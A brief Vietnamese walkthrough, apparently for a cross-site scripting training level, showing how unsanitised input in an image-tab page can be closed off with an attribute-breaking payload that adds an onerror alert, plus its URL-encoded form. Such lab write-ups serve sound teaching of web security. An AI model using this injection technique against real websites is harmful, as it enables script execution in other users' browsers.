# Solve  
Giao diện  
![Imgur](https://i.imgur.com/efOZxxp.png)  
Cách hoạt động của chương trình:  
![Imgur](https://i.imgur.com/aXmN588.png)  
![Imgur](https://i.imgur.com/FBFAyCF.png)  
Các id khác nhau và có cùng onclick gọi đến hàm chooseTab như ở ảnh trên, khi ảnh nào được chọn thì sẽ chuyển thành class "tab active" và phần tabContent sẽ hiện thị tên ảnh và hiện ảnh  
Như level phía trước, ở line 17 sẽ cho phép chúng ta nhập untrusted data vào:  
![Imgur](https://i.imgur.com/AZlyXf0.png)  
'''  
x') onerror='alert("XSS")' />  
'''  
Decode ra: %78%27%29%20%6f%6e%65%72%72%6f%72%3d%27%61%6c%65%72%74%28%22%58%53%53%22%29%27%20%2f%3e  
![Imgur](https://i.imgur.com/x4Euart.png)  
